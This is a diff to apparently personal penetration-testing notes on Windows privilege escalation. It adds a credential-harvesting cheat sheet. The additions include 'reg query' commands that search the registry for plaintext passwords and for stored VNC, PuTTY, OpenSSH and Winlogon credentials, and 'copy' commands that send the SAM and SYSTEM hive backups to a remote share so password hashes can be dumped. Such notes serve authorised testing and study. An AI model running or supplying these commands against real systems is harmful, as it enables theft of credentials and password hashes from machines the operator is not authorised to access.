@@ -87,10 +87,26 @@ explain the switches:
 /i = Regular (vs. administrative) installation
 
 -------------------- Passwords --------------------
-Windows itself sometimes will store passwords in plaintext in the Registry.
+source : https://steflan-security.com/windows-privilege-escalation-credential-harvesting/
+Windows itself sometimes will store passwords in plaintext in the Registry. Windows stores password hashes in the Security Account Manager (SAM).
 
-> reg query HKLM /f password /t REG_SZ /s                                                                            ---> To search the in registers for keys and values that contain “password”
-> reg query HKCU /f password /t REG_SZ /s                                                                            ---> To search the in registers for keys and values that contain “password”
+> reg query HKLM /f password /t REG_SZ /s                                                                            ---> To search the in registers for keys and values that contain “password” in local machine
+> reg query HKCU /f password /t REG_SZ /s                                                                            ---> To search the in registers for keys and values that contain “password” in current user
+> reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
+> reg query "HKCU\Software\ORL\WinVNC3\Password"
+> reg query "HKCU\Software\TightVNC\Server"
+> reg query "HKCU\Software\OpenSSH\Agent\Key"
+> reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
+> reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
+
+> copy C:\Windows\Repair\SAM \\IP\Sharename\                                                                          ---> To dump windows hashes 
+> copy C:\Windows\Repair\SYSTEM \\IP\Sharename\                                                                       ---> To dump windows hashes
+
+
+
+
+
+
 
 
 
